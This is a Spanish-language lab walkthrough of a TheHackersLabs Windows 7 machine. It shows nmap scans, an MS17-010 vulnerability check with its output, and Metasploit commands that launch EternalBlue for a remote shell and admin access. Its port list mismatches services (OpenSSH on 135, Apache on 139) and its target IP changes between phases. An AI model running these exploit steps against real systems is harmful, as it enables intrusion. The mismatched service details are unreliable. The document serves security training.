# Fase 1- Tanteo
![image](https://github.com/haw441kings/ThehHackersLabs-WriteUps/assets/136659799/407c2356-3bf2-4beb-9b64-4dd77d2e7006)
En esta fase inicial, realizamos un escaneo de puertos para identificar los servicios disponibles en la máquina objetivo. Utilizamos la herramienta Nmap con una serie de opciones para obtener información detallada y realizar un análisis exhaustivo de los puertos abiertos.
### Comando Nmap utilizado:

`sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`

### Detalles del Comando:

- `sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`
- `-p-`: Escaneo de todos los puertos.
- `--open`: Muestra solo puertos abiertos.
- `-sS`: Escaneo SYN para determinar el estado de los puertos.
- `-sC`: Activa detección de versiones y vulnerabilidades.
- `-sV`: Escaneo de versiones de servicios.
- `--min-rate 5000`: Velocidad mínima de escaneo.
- `-vvv`: Verbosidad muy alta para información detallada.
- `-n`: Desactiva la resolución de DNS.
- `-Pn`: Ignora la detección de hosts en línea.
- `192.168.52.139`: IP de la máquina objetivo.
- `-oN Escaneo`: Guarda resultados en archivo "Escaneo".

### Resultados:

#### Puertos Abiertos:

2.  **135/tcp(msrpc):** OpenSSH 9.2p1 
3. **139/tcp(netbios-ssn):** Apache httpd 2.4.59
4. **445/tcp(microsoft-ds):** syn-ack ttl 128 Windows 7 Home Basic 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)

# Fase 2- Exploración

#### Windows 7
Al detectar que estamos delante de un Windows 7, procedemos a utilizar un script de nmap para verificar si es vulnerable a eternalblue, comando utilizado:
```python
❯ sudo nmap --script smb-vuln-ms17-010 -p 445 192.168.1.10
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-09 19:22 -03
Nmap scan report for 192.168.1.10 (192.168.1.10)
Host is up (0.00046s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 00:0C:29:CD:6D:53 (VMware)

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

Nmap done: 1 IP address (1 host up) scanned in 0.26 seconds
```
Este resultado nos indica que si, es vulnerable.

# Fase 3- Explotación

#### Eternalblue
Para explotar este vulnerabilidad se haría de la siguiente forma:
```python
> msfconsole
Con este comando usamos metasploit.

> search ms17_010
Este comando sirve para buscar la vulnerabilidad.

> use 0
Le indicamos el numero del exploit a usar.

> show options
Le indicamos las opciones con las que funcióna este exploit.

> set RHOSTS 192.168.1.10
Con este comando Le indicamos la ip que queremos atacar.

> exploit
Con este comando lanzamos el exploit.

```

![image](https://github.com/haw441kings/ThehHackersLabs-WriteUps/assets/136659799/21795e08-0293-4e7b-a599-884f6c688da7)
Y así estaríamos dentro, con el comando shell, le indicamos que queremos usar una shell en lugar de meterpreter.

# Fase 4- Privilegios
![image](https://github.com/haw441kings/ThehHackersLabs-WriteUps/assets/136659799/f476ec22-4f1d-4051-bc5e-ddf4237a6560)

Podemos acceder al usuario Admin, Maquina Finalizada.
